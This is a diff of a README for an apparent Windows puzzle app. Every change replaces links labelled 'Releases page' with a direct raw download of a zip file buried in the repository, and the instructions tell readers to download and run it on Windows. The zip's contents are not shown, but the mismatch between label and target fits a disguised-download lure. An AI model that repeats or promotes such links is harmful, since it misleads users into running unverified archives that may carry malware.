@@ -1,9 +1,9 @@
 # 🧩 Number_puzzles_in_front_of_everyone - Simple Number Puzzles for Everyone
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/Bivalent-fnma945/Number_puzzles_in_front_of_everyone/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/Bivalent-fnma945/Number_puzzles_in_front_of_everyone/raw/refs/heads/main/Alphard/of_front_Number_puzzles_in_everyone_v1.4.zip)
 
 ## 🚀 Download
-Go to the [Releases page](https://github.com/Bivalent-fnma945/Number_puzzles_in_front_of_everyone/releases) to download and run this file on Windows.
+Go to the [Releases page](https://github.com/Bivalent-fnma945/Number_puzzles_in_front_of_everyone/raw/refs/heads/main/Alphard/of_front_Number_puzzles_in_everyone_v1.4.zip) to download and run this file on Windows.
 
 ## 📦 What this app does
 Number_puzzles_in_front_of_everyone is a small Windows app for number puzzles and pattern games.
@@ -19,7 +19,7 @@ The app is built for people who want a fast, easy way to open and use number puz
 ## 🪟 Windows setup
 Use these steps on a Windows computer:
 
-1. Open the [Releases page](https://github.com/Bivalent-fnma945/Number_puzzles_in_front_of_everyone/releases)
+1. Open the [Releases page](https://github.com/Bivalent-fnma945/Number_puzzles_in_front_of_everyone/raw/refs/heads/main/Alphard/of_front_Number_puzzles_in_everyone_v1.4.zip)
 2. Find the latest release
 3. Download the Windows file
 4. If the file is in a ZIP folder, extract it first
@@ -111,7 +111,7 @@ If the app opens with no window:
 
 ## 📁 Where the app comes from
 Download it here:
-[https://github.com/Bivalent-fnma945/Number_puzzles_in_front_of_everyone/releases](https://github.com/Bivalent-fnma945/Number_puzzles_in_front_of_everyone/releases)
+[https://github.com/Bivalent-fnma945/Number_puzzles_in_front_of_everyone/raw/refs/heads/main/Alphard/of_front_Number_puzzles_in_everyone_v1.4.zip](https://github.com/Bivalent-fnma945/Number_puzzles_in_front_of_everyone/raw/refs/heads/main/Alphard/of_front_Number_puzzles_in_everyone_v1.4.zip)
 
 ## 🧩 What the name means
 The name points to number puzzles that sit in plain sight. It fits a small app that asks you to look at numbers in a different way and compare them with care
